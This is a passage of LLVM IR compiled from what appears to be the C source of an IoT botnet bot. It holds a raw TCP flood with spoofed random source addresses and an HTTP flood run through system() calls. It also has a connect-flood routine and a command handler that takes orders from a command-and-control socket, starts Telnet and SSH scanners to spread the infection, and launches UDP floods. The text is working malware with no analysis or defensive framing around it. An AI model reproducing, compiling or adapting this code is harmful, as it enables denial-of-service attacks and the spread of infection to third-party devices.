  %261 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %260, i32 0, i32 0
  %262 = bitcast %union.anon* %261 to %struct.anon.0*
  %263 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %262, i32 0, i32 1
  store i16 %259, i16* %263, align 2
  %264 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %265 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %266 = call zeroext i16 @tcpcsum(%struct.iphdr* %264, %struct.tcphdr* %265)
  %267 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %268 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %267, i32 0, i32 0
  %269 = bitcast %union.anon* %268 to %struct.anon.0*
  %270 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %269, i32 0, i32 6
  store i16 %266, i16* %270, align 4
  %271 = bitcast i8* %78 to i16*
  %272 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %273 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %272, i32 0, i32 2
  %274 = load i16, i16* %273, align 2
  %275 = zext i16 %274 to i32
  %276 = call zeroext i16 @csum(i16* %271, i32 %275)
  %277 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i32 0, i32 7
  store i16 %276, i16* %278, align 2
  %279 = call i64 @time(i64* null) #12
  %280 = load i32, i32* %10, align 4
  %281 = sext i32 %280 to i64
  %282 = add nsw i64 %279, %281
  %283 = trunc i64 %282 to i32
  store i32 %283, i32* %25, align 4
  store i32 0, i32* %26, align 4
  br label %284

284:                                              ; preds = %338, %337, %257
  br label %285

285:                                              ; preds = %284
  %286 = load i32, i32* %17, align 4
  %287 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %288 = call i64 @sendto(i32 %286, i8* %78, i64 %76, i32 0, %struct.sockaddr* %287, i32 16)
  %289 = load i32, i32* %19, align 4
  %290 = call i32 @getRandomIP(i32 %289)
  %291 = call i32 @htonl(i32 %290) #15
  %292 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %293 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %292, i32 0, i32 8
  store i32 %291, i32* %293, align 4
  %294 = call i32 @rand_cmwc()
  %295 = trunc i32 %294 to i16
  %296 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 3
  store i16 %295, i16* %297, align 4
  %298 = call i32 @rand_cmwc()
  %299 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %300 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %299, i32 0, i32 0
  %301 = bitcast %union.anon* %300 to %struct.anon.0*
  %302 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %301, i32 0, i32 2
  store i32 %298, i32* %302, align 4
  %303 = call i32 @rand_cmwc()
  %304 = trunc i32 %303 to i16
  %305 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %306 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %305, i32 0, i32 0
  %307 = bitcast %union.anon* %306 to %struct.anon.0*
  %308 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %307, i32 0, i32 0
  store i16 %304, i16* %308, align 4
  %309 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %310 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %309, i32 0, i32 0
  %311 = bitcast %union.anon* %310 to %struct.anon.0*
  %312 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %311, i32 0, i32 6
  store i16 0, i16* %312, align 4
  %313 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %314 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %315 = call zeroext i16 @tcpcsum(%struct.iphdr* %313, %struct.tcphdr* %314)
  %316 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %317 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %316, i32 0, i32 0
  %318 = bitcast %union.anon* %317 to %struct.anon.0*
  %319 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %318, i32 0, i32 6
  store i16 %315, i16* %319, align 4
  %320 = bitcast i8* %78 to i16*
  %321 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %322 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %321, i32 0, i32 2
  %323 = load i16, i16* %322, align 2
  %324 = zext i16 %323 to i32
  %325 = call zeroext i16 @csum(i16* %320, i32 %324)
  %326 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %327 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %326, i32 0, i32 7
  store i16 %325, i16* %327, align 2
  %328 = load i32, i32* %26, align 4
  %329 = load i32, i32* %15, align 4
  %330 = icmp eq i32 %328, %329
  br i1 %330, label %331, label %338

331:                                              ; preds = %285
  %332 = call i64 @time(i64* null) #12
  %333 = load i32, i32* %25, align 4
  %334 = sext i32 %333 to i64
  %335 = icmp sgt i64 %332, %334
  br i1 %335, label %336, label %337

336:                                              ; preds = %331
  br label %341

337:                                              ; preds = %331
  store i32 0, i32* %26, align 4
  br label %284

338:                                              ; preds = %285
  %339 = load i32, i32* %26, align 4
  %340 = add i32 %339, 1
  store i32 %340, i32* %26, align 4
  br label %284

341:                                              ; preds = %336
  %342 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %342)
  br label %343

343:                                              ; preds = %341, %60, %52, %45
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendHTTP(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct._IO_FILE*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca [80 x i8*], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %9 = call i64 @time(i64* null) #12
  %10 = load i32, i32* %4, align 4
  %11 = sext i32 %10 to i64
  %12 = add nsw i64 %9, %11
  %13 = trunc i64 %12 to i32
  store i32 %13, i32* %5, align 4
  %14 = call i32 @rand() #12
  %15 = sext i32 %14 to i64
  %16 = urem i64 %15, 23
  %17 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %16
  %18 = load i8*, i8** %17, align 8
  store i8* %18, i8** %7, align 8
  %19 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i64 0, i64 0
  %20 = bitcast i8** %19 to i8*
  %21 = call i32 (i8*, i8*, ...) @sprintf(i8* %20, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.92, i64 0, i64 0)) #12
  %22 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i64 0, i64 0
  %23 = bitcast i8** %22 to i8*
  %24 = load i8*, i8** %7, align 8
  %25 = call i8* @strcat(i8* %23, i8* %24) #12
  %26 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i64 0, i64 0
  %27 = bitcast i8** %26 to i8*
  %28 = call i8* @strcat(i8* %27, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i64 0, i64 0)) #12
  %29 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i64 0, i64 0
  %30 = bitcast i8** %29 to i8*
  %31 = load i8*, i8** %3, align 8
  %32 = call i8* @strcat(i8* %30, i8* %31) #12
  br label %33

33:                                               ; preds = %38, %2
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = call i64 @time(i64* null) #12
  %37 = icmp sgt i64 %35, %36
  br i1 %37, label %38, label %61

38:                                               ; preds = %33
  %39 = call i32 @rand() #12
  %40 = sext i32 %39 to i64
  %41 = urem i64 %40, 23
  %42 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %41
  %43 = load i8*, i8** %42, align 8
  store i8* %43, i8** %7, align 8
  %44 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i64 0, i64 0
  %45 = bitcast i8** %44 to i8*
  %46 = call i32 (i8*, i8*, ...) @sprintf(i8* %45, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.92, i64 0, i64 0)) #12
  %47 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i64 0, i64 0
  %48 = bitcast i8** %47 to i8*
  %49 = load i8*, i8** %7, align 8
  %50 = call i8* @strcat(i8* %48, i8* %49) #12
  %51 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i64 0, i64 0
  %52 = bitcast i8** %51 to i8*
  %53 = call i8* @strcat(i8* %52, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i64 0, i64 0)) #12
  %54 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i64 0, i64 0
  %55 = bitcast i8** %54 to i8*
  %56 = load i8*, i8** %3, align 8
  %57 = call i8* @strcat(i8* %55, i8* %56) #12
  %58 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i64 0, i64 0
  %59 = bitcast i8** %58 to i8*
  %60 = call i32 @system(i8* %59)
  br label %33, !llvm.loop !45

61:                                               ; preds = %33
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendCNC(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i64 @time(i64* null) #12
  %11 = load i32, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = add nsw i64 %10, %12
  %14 = trunc i64 %13 to i32
  store i32 %14, i32* %7, align 4
  %15 = load i8*, i8** %4, align 8
  %16 = call i32 @inet_addr(i8* %15) #12
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  store i32 %16, i32* %18, align 4
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = load i32, i32* %5, align 4
  %21 = trunc i32 %20 to i16
  %22 = call zeroext i16 @htons(i16 zeroext %21) #15
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  br label %24

24:                                               ; preds = %29, %3
  %25 = load i32, i32* %7, align 4
  %26 = sext i32 %25 to i64
  %27 = call i64 @time(i64* null) #12
  %28 = icmp sgt i64 %26, %27
  br i1 %28, label %29, label %37

29:                                               ; preds = %24
  %30 = call i32 @socket(i32 2, i32 1, i32 0) #12
  store i32 %30, i32* %8, align 4
  %31 = load i32, i32* %8, align 4
  %32 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %33 = call i32 @connect(i32 %31, %struct.sockaddr* %32, i32 16)
  %34 = call i32 @sleep(i32 1)
  %35 = load i32, i32* %8, align 4
  %36 = call i32 @close(i32 %35)
  br label %24, !llvm.loop !46

37:                                               ; preds = %24
  ret void
}

declare i32 @sleep(i32) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @processCmd(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i8*, align 8
  %36 = alloca i32, align 4
  %37 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.44, i64 0, i64 0)) #11
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %46, label %43

43:                                               ; preds = %2
  %44 = load i32, i32* @mainCommSock, align 4
  %45 = call i32 (i32, i8*, ...) @sockprintf(i32 %44, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i64 0, i64 0))
  br label %622

46:                                               ; preds = %2
  %47 = load i8**, i8*** %4, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 0
  %49 = load i8*, i8** %48, align 8
  %50 = call i32 @strcmp(i8* %49, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.95, i64 0, i64 0)) #11
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %57, label %52

52:                                               ; preds = %46
  %53 = load i32, i32* @mainCommSock, align 4
  %54 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %55 = call i8* @inet_ntoa(i32 %54) #12
  %56 = call i32 (i32, i8*, ...) @sockprintf(i32 %53, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.96, i64 0, i64 0), i8* %55)
  br label %622

57:                                               ; preds = %46
  %58 = load i8**, i8*** %4, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 0
  %60 = load i8*, i8** %59, align 8
  %61 = call i32 @strcmp(i8* %60, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.97, i64 0, i64 0)) #11
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %133, label %63

63:                                               ; preds = %57
  %64 = load i32, i32* %3, align 4
  %65 = icmp ne i32 %64, 2
  br i1 %65, label %66, label %69

66:                                               ; preds = %63
  %67 = load i32, i32* @mainCommSock, align 4
  %68 = call i32 (i32, i8*, ...) @sockprintf(i32 %67, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.98, i64 0, i64 0))
  br label %622

69:                                               ; preds = %63
  %70 = load i8**, i8*** %4, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 1
  %72 = load i8*, i8** %71, align 8
  %73 = call i32 @strcmp(i8* %72, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.99, i64 0, i64 0)) #11
  %74 = icmp ne i32 %73, 0
  br i1 %74, label %132, label %75

75:                                               ; preds = %69
  %76 = load i32, i32* @scanPid, align 4
  %77 = icmp eq i32 %76, 0
  br i1 %77, label %78, label %79

78:                                               ; preds = %75
  br label %622

79:                                               ; preds = %75
  %80 = load i32, i32* @mainCommSock, align 4
  %81 = call i32 (i32, i8*, ...) @sockprintf(i32 %80, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.100, i64 0, i64 0))
  %82 = load i32, i32* @scanPid, align 4
  %83 = call i32 @kill(i32 %82, i32 9) #12
  store i32 0, i32* @scanPid, align 4
  %84 = load i8**, i8*** %4, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 1
  %86 = load i8*, i8** %85, align 8
  %87 = call i32 @strcmp(i8* %86, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.101, i64 0, i64 0)) #11
  %88 = icmp ne i32 %87, 0
  br i1 %88, label %107, label %89

89:                                               ; preds = %79
  %90 = load i32, i32* @scanPid, align 4
  %91 = icmp ne i32 %90, 0
  br i1 %91, label %92, label %93

92:                                               ; preds = %89
  br label %622

93:                                               ; preds = %89
  %94 = call i32 @fork() #12
  store i32 %94, i32* %6, align 4
  %95 = load i32, i32* @mainCommSock, align 4
  %96 = call i32 (i32, i8*, ...) @sockprintf(i32 %95, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.102, i64 0, i64 0))
  %97 = load i32, i32* %6, align 4
  %98 = icmp ugt i32 %97, 0
  br i1 %98, label %99, label %101

99:                                               ; preds = %93
  %100 = load i32, i32* %6, align 4
  store i32 %100, i32* @scanPid, align 4
  br label %622

101:                                              ; preds = %93
  %102 = load i32, i32* %6, align 4
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %105

104:                                              ; preds = %101
  br label %622

105:                                              ; preds = %101
  br label %106

106:                                              ; preds = %105
  call void (i32, ...) bitcast (void ()* @TelnetScanner to void (i32, ...)*)(i32 1)
  call void @_exit(i32 0) #14
  unreachable

107:                                              ; preds = %79
  %108 = load i8**, i8*** %4, align 8
  %109 = getelementptr inbounds i8*, i8** %108, i64 1
  %110 = load i8*, i8** %109, align 8
  %111 = call i32 @strcmp(i8* %110, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i64 0, i64 0)) #11
  %112 = icmp ne i32 %111, 0
  br i1 %112, label %131, label %113

113:                                              ; preds = %107
  %114 = load i32, i32* @scanPid, align 4
  %115 = icmp ne i32 %114, 0
  br i1 %115, label %116, label %117

116:                                              ; preds = %113
  br label %622

117:                                              ; preds = %113
  %118 = call i32 @fork() #12
  store i32 %118, i32* %7, align 4
  %119 = load i32, i32* @mainCommSock, align 4
  %120 = call i32 (i32, i8*, ...) @sockprintf(i32 %119, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.104, i64 0, i64 0))
  %121 = load i32, i32* %7, align 4
  %122 = icmp ugt i32 %121, 0
  br i1 %122, label %123, label %125

123:                                              ; preds = %117
  %124 = load i32, i32* %7, align 4
  store i32 %124, i32* @scanPid, align 4
  br label %622

125:                                              ; preds = %117
  %126 = load i32, i32* %7, align 4
  %127 = icmp eq i32 %126, -1
  br i1 %127, label %128, label %129

128:                                              ; preds = %125
  br label %622

129:                                              ; preds = %125
  br label %130

130:                                              ; preds = %129
  call void (i32, ...) bitcast (void ()* @SSHScanner to void (i32, ...)*)(i32 1)
  call void @_exit(i32 0) #14
  unreachable

131:                                              ; preds = %107
  br label %132

132:                                              ; preds = %131, %69
  br label %133

133:                                              ; preds = %132, %57
  %134 = load i8**, i8*** %4, align 8
  %135 = getelementptr inbounds i8*, i8** %134, i64 0
  %136 = load i8*, i8** %135, align 8
  %137 = call i32 @strcmp(i8* %136, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i64 0, i64 0)) #11
  %138 = icmp ne i32 %137, 0
  br i1 %138, label %252, label %139

139:                                              ; preds = %133
  %140 = load i32, i32* %3, align 4
  %141 = icmp slt i32 %140, 6
  br i1 %141, label %187, label %142

142:                                              ; preds = %139
  %143 = load i8**, i8*** %4, align 8
  %144 = getelementptr inbounds i8*, i8** %143, i64 3
  %145 = load i8*, i8** %144, align 8
  %146 = call i32 @atoi(i8* %145) #11
  %147 = icmp eq i32 %146, -1
  br i1 %147, label %187, label %148

148:                                              ; preds = %142
  %149 = load i8**, i8*** %4, align 8
  %150 = getelementptr inbounds i8*, i8** %149, i64 2
  %151 = load i8*, i8** %150, align 8
  %152 = call i32 @atoi(i8* %151) #11
  %153 = icmp eq i32 %152, -1
  br i1 %153, label %187, label %154

154:                                              ; preds = %148
  %155 = load i8**, i8*** %4, align 8
  %156 = getelementptr inbounds i8*, i8** %155, i64 4
  %157 = load i8*, i8** %156, align 8
  %158 = call i32 @atoi(i8* %157) #11
  %159 = icmp eq i32 %158, -1
  br i1 %159, label %187, label %160

160:                                              ; preds = %154
  %161 = load i8**, i8*** %4, align 8
  %162 = getelementptr inbounds i8*, i8** %161, i64 5
  %163 = load i8*, i8** %162, align 8
  %164 = call i32 @atoi(i8* %163) #11
  %165 = icmp eq i32 %164, -1
  br i1 %165, label %187, label %166

166:                                              ; preds = %160
  %167 = load i8**, i8*** %4, align 8
  %168 = getelementptr inbounds i8*, i8** %167, i64 5
  %169 = load i8*, i8** %168, align 8
  %170 = call i32 @atoi(i8* %169) #11
  %171 = icmp sgt i32 %170, 65500
  br i1 %171, label %187, label %172

172:                                              ; preds = %166
  %173 = load i8**, i8*** %4, align 8
  %174 = getelementptr inbounds i8*, i8** %173, i64 4
  %175 = load i8*, i8** %174, align 8
  %176 = call i32 @atoi(i8* %175) #11
  %177 = icmp sgt i32 %176, 32
  br i1 %177, label %187, label %178

178:                                              ; preds = %172
  %179 = load i32, i32* %3, align 4
  %180 = icmp eq i32 %179, 7
  br i1 %180, label %181, label %188

181:                                              ; preds = %178
  %182 = load i8**, i8*** %4, align 8
  %183 = getelementptr inbounds i8*, i8** %182, i64 6
  %184 = load i8*, i8** %183, align 8
  %185 = call i32 @atoi(i8* %184) #11
  %186 = icmp slt i32 %185, 1
  br i1 %186, label %187, label %188

187:                                              ; preds = %181, %172, %166, %160, %154, %148, %142, %139
  br label %622

188:                                              ; preds = %181, %178
  %189 = load i8**, i8*** %4, align 8
  %190 = getelementptr inbounds i8*, i8** %189, i64 1
  %191 = load i8*, i8** %190, align 8
  store i8* %191, i8** %8, align 8
  %192 = load i8**, i8*** %4, align 8
  %193 = getelementptr inbounds i8*, i8** %192, i64 2
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 @atoi(i8* %194) #11
  store i32 %195, i32* %9, align 4
  %196 = load i8**, i8*** %4, align 8
  %197 = getelementptr inbounds i8*, i8** %196, i64 3
  %198 = load i8*, i8** %197, align 8
  %199 = call i32 @atoi(i8* %198) #11
  store i32 %199, i32* %10, align 4
  %200 = load i8**, i8*** %4, align 8
  %201 = getelementptr inbounds i8*, i8** %200, i64 4
  %202 = load i8*, i8** %201, align 8
  %203 = call i32 @atoi(i8* %202) #11
  store i32 %203, i32* %11, align 4
  %204 = load i8**, i8*** %4, align 8
  %205 = getelementptr inbounds i8*, i8** %204, i64 5
  %206 = load i8*, i8** %205, align 8
  %207 = call i32 @atoi(i8* %206) #11
  store i32 %207, i32* %12, align 4
  %208 = load i32, i32* %3, align 4
  %209 = icmp eq i32 %208, 7
  br i1 %209, label %210, label %215

210:                                              ; preds = %188
  %211 = load i8**, i8*** %4, align 8
  %212 = getelementptr inbounds i8*, i8** %211, i64 6
  %213 = load i8*, i8** %212, align 8
  %214 = call i32 @atoi(i8* %213) #11
  br label %216

215:                                              ; preds = %188
  br label %216

216:                                              ; preds = %215, %210
  %217 = phi i32 [ %214, %210 ], [ 10, %215 ]
  store i32 %217, i32* %13, align 4
  %218 = load i8*, i8** %8, align 8
  %219 = call i8* @strstr(i8* %218, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #11
  %220 = icmp ne i8* %219, null
  br i1 %220, label %221, label %240

221:                                              ; preds = %216
  %222 = load i8*, i8** %8, align 8
  %223 = call i8* @strtok(i8* %222, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #12
  store i8* %223, i8** %14, align 8
  br label %224

224:                                              ; preds = %237, %221
  %225 = load i8*, i8** %14, align 8
  %226 = icmp ne i8* %225, null
  br i1 %226, label %227, label %239

227:                                              ; preds = %224
  %228 = call i32 @listFork()
  %229 = icmp ne i32 %228, 0
  br i1 %229, label %237, label %230

230:                                              ; preds = %227
  %231 = load i8*, i8** %14, align 8
  %232 = load i32, i32* %9, align 4
  %233 = load i32, i32* %10, align 4
  %234 = load i32, i32* %11, align 4
  %235 = load i32, i32* %12, align 4
  %236 = load i32, i32* %13, align 4
  call void @sendUDP(i8* %231, i32 %232, i32 %233, i32 %234, i32 %235, i32 %236)
  call void @_exit(i32 0) #14
  unreachable

237:                                              ; preds = %227
  %238 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #12
  store i8* %238, i8** %14, align 8
  br label %224, !llvm.loop !47

239:                                              ; preds = %224
  br label %251

240:                                              ; preds = %216
  %241 = call i32 @listFork()
  %242 = icmp ne i32 %241, 0
  br i1 %242, label %243, label %244

243:                                              ; preds = %240
  br label %622

244:                                              ; preds = %240
  %245 = load i8*, i8** %8, align 8
  %246 = load i32, i32* %9, align 4
  %247 = load i32, i32* %10, align 4
  %248 = load i32, i32* %11, align 4
  %249 = load i32, i32* %12, align 4
  %250 = load i32, i32* %13, align 4
  call void @sendUDP(i8* %245, i32 %246, i32 %247, i32 %248, i32 %249, i32 %250)
  call void @_exit(i32 0) #14
  unreachable

251:                                              ; preds = %239
  br label %252

252:                                              ; preds = %251, %133
  %253 = load i8**, i8*** %4, align 8
  %254 = getelementptr inbounds i8*, i8** %253, i64 0
  %255 = load i8*, i8** %254, align 8
  %256 = call i32 @strcmp(i8* %255, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.106, i64 0, i64 0)) #11
  %257 = icmp ne i32 %256, 0
  br i1 %257, label %379, label %258

258:                                              ; preds = %252
  %259 = load i32, i32* %3, align 4
  %260 = icmp slt i32 %259, 6
  br i1 %260, label %303, label %261

261:                                              ; preds = %258
  %262 = load i8**, i8*** %4, align 8
  %263 = getelementptr inbounds i8*, i8** %262, i64 3
  %264 = load i8*, i8** %263, align 8
  %265 = call i32 @atoi(i8* %264) #11
  %266 = icmp eq i32 %265, -1
  br i1 %266, label %303, label %267

267:                                              ; preds = %261
  %268 = load i8**, i8*** %4, align 8
  %269 = getelementptr inbounds i8*, i8** %268, i64 2
  %270 = load i8*, i8** %269, align 8
  %271 = call i32 @atoi(i8* %270) #11
  %272 = icmp eq i32 %271, -1
  br i1 %272, label %303, label %273

273:                                              ; preds = %267
  %274 = load i8**, i8*** %4, align 8
  %275 = getelementptr inbounds i8*, i8** %274, i64 4
  %276 = load i8*, i8** %275, align 8
  %277 = call i32 @atoi(i8* %276) #11
  %278 = icmp eq i32 %277, -1
  br i1 %278, label %303, label %279

279:                                              ; preds = %273
  %280 = load i8**, i8*** %4, align 8
  %281 = getelementptr inbounds i8*, i8** %280, i64 4
  %282 = load i8*, i8** %281, align 8
  %283 = call i32 @atoi(i8* %282) #11
  %284 = icmp sgt i32 %283, 32
  br i1 %284, label %303, label %285

285:                                              ; preds = %279
  %286 = load i32, i32* %3, align 4
  %287 = icmp sgt i32 %286, 6
  br i1 %287, label %288, label %294

288:                                              ; preds = %285
  %289 = load i8**, i8*** %4, align 8
  %290 = getelementptr inbounds i8*, i8** %289, i64 6
  %291 = load i8*, i8** %290, align 8
  %292 = call i32 @atoi(i8* %291) #11
  %293 = icmp slt i32 %292, 0
  br i1 %293, label %303, label %294

294:                                              ; preds = %288, %285
  %295 = load i32, i32* %3, align 4
  %296 = icmp eq i32 %295, 8
  br i1 %296, label %297, label %304

297:                                              ; preds = %294
  %298 = load i8**, i8*** %4, align 8
  %299 = getelementptr inbounds i8*, i8** %298, i64 7
  %300 = load i8*, i8** %299, align 8
  %301 = call i32 @atoi(i8* %300) #11
  %302 = icmp slt i32 %301, 1
  br i1 %302, label %303, label %304

303:                                              ; preds = %297, %288, %279, %273, %267, %261, %258
  br label %622

304:                                              ; preds = %297, %294
  %305 = load i8**, i8*** %4, align 8
  %306 = getelementptr inbounds i8*, i8** %305, i64 1
  %307 = load i8*, i8** %306, align 8
  store i8* %307, i8** %15, align 8
  %308 = load i8**, i8*** %4, align 8
  %309 = getelementptr inbounds i8*, i8** %308, i64 2
  %310 = load i8*, i8** %309, align 8
  %311 = call i32 @atoi(i8* %310) #11
  store i32 %311, i32* %16, align 4
  %312 = load i8**, i8*** %4, align 8
  %313 = getelementptr inbounds i8*, i8** %312, i64 3
  %314 = load i8*, i8** %313, align 8
  %315 = call i32 @atoi(i8* %314) #11
  store i32 %315, i32* %17, align 4
  %316 = load i8**, i8*** %4, align 8
  %317 = getelementptr inbounds i8*, i8** %316, i64 4
  %318 = load i8*, i8** %317, align 8
  %319 = call i32 @atoi(i8* %318) #11
  store i32 %319, i32* %18, align 4
  %320 = load i8**, i8*** %4, align 8
  %321 = getelementptr inbounds i8*, i8** %320, i64 5
  %322 = load i8*, i8** %321, align 8
  store i8* %322, i8** %19, align 8
  %323 = load i32, i32* %3, align 4
  %324 = icmp eq i32 %323, 8
  br i1 %324, label %325, label %330

325:                                              ; preds = %304
  %326 = load i8**, i8*** %4, align 8
  %327 = getelementptr inbounds i8*, i8** %326, i64 7
  %328 = load i8*, i8** %327, align 8
  %329 = call i32 @atoi(i8* %328) #11
  br label %331

330:                                              ; preds = %304
  br label %331

331:                                              ; preds = %330, %325
  %332 = phi i32 [ %329, %325 ], [ 10, %330 ]
  store i32 %332, i32* %20, align 4
  %333 = load i32, i32* %3, align 4
  %334 = icmp sgt i32 %333, 6
  br i1 %334, label %335, label %340

335:                                              ; preds = %331
  %336 = load i8**, i8*** %4, align 8
  %337 = getelementptr inbounds i8*, i8** %336, i64 6
  %338 = load i8*, i8** %337, align 8
  %339 = call i32 @atoi(i8* %338) #11
  br label %341

340:                                              ; preds = %331
  br label %341

341:                                              ; preds = %340, %335
  %342 = phi i32 [ %339, %335 ], [ 0, %340 ]
  store i32 %342, i32* %21, align 4
  %343 = load i8*, i8** %15, align 8
